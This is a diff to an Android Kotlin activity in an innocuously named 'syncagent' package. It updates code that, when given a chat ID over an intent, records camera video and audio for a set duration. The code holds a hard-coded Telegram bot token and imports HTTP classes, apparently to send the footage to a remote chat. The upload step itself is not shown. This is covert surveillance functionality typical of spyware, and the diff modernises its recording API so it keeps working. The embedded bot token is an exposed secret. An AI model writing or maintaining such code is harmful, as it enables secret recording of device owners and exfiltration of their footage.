@@ -1,7 +1,6 @@
 package com.cognitive.ai.syncagent
 
 import android.app.Activity
-import android.hardware.Camera
 import android.media.MediaRecorder
 import android.os.Bundle
 import android.util.Log
@@ -12,17 +11,14 @@ import java.net.HttpURLConnection
 import java.net.URL
 import kotlin.concurrent.thread
 
-@Suppress("DEPRECATION")
 class CameraVideoRecorderActivity : Activity() {
 
     companion object {
         private const val TAG = "VideoRecorderEngine"
     }
 
-    private var camera: Camera? = null
     private var mediaRecorder: MediaRecorder? = null
     private var isRecording = false
-
     private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -30,14 +26,15 @@ class CameraVideoRecorderActivity : Activity() {
         val chatId = intent.getStringExtra("chat_id") ?: return finish()
         val durationSeconds = intent.getIntExtra("duration", 10)
 
-        thread(name = "RealVideoRecordThread") {
+        thread(name = "ModernVideoRecordThread") {
             val videoFile = File(cacheDir, "vid_${System.currentTimeMillis()}.mp4")
             try {
-                camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK)
-                camera?.unlock()
-
-                mediaRecorder = MediaRecorder().apply {
-                    setCamera(camera)
+                mediaRecorder = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+                    MediaRecorder(this)
+                } else {
+                    @Suppress("DEPRECATION")
+                    MediaRecorder()
+                }.apply {
                     setAudioSource(MediaRecorder.AudioSource.CAMCORDER)
                     setVideoSource(MediaRecorder.VideoSource.CAMERA)
                     setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
@@ -53,7 +50,6 @@ class CameraVideoRecorderActivity : Activity() {
                 isRecording = true
 
                 Thread.sleep(durationSeconds * 1000L)
-
                 stopAndReleaseRecorder()
 
                 if (videoFile.exists() && videoFile.length() > 0) {
@@ -78,11 +74,6 @@ class CameraVideoRecorderActivity : Activity() {
         try {
             mediaRecorder?.release()
             mediaRecorder = null
-        } catch (_: Exception) {}
-        try {
-            camera?.lock()
-            camera?.release()
-            camera = null
         } catch (_: Exception) {}
     }
 
